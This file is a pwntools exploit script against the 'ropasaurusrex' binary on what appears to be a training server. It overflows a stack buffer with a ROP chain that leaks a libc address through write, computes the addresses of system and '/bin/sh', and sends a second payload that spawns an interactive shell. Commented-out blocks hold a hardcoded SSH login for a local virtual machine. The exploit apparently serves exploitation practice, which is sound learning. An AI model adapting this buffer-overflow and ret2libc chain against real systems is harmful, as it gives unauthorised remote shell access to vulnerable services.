from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

#r = process("./ropasaurusrex")
r = remote("bin.training.jinblack.it", 2014)
'''
if "REMOTE" not in args:
    ssh = ssh("acidburn", "192.168.56.104", password="acidburn")
    r = ssh.process("./ropasaurusrex")

    input("wait")
else:
    r = remote("bin.training.jinblack.it", 2010)

BIN = ELF("./ropasaurusrex")
LIBC = ELF("./libc-2.27.so")

# to access these files, you need to type on the terminal: ipython (or sudo ipython)
# then you need to be in the right folder and copy paste all these commands

'''

'''
gdb.attach(r, """
        b *0x0804841c
	#b *0x08048442
	c
""")
'''
ptr_write = 0x0804830c
next_fun = 0x0804841d
got = 0x08049614

payload = b"A"*140
payload += p32(ptr_write)
payload += p32(next_fun)
payload += p32(1)
payload += p32(got)
payload += p32(16)
r.send(payload)


leak = u32(r.recv(4))
libc_base = leak - 0xe6d80
system = libc_base + 0x003d200
binsh = libc_base + 0x17e0cf
print("[!] leak: %#x" % leak)
print("[!] libc: %#x" % libc_base)
print("[!] system: %#x" % system)
print("[!] binsh: %#x" % binsh)

#LIBC.address = libc_base
#system = LIBC.symbols["system"]

#binsh = next(LIBC.search(b"/bin/shm")) 

payload2 = b"A"*140
payload2 += p32(system) + p32(0) + p32(binsh)

r.send(payload2)

r.interactive()



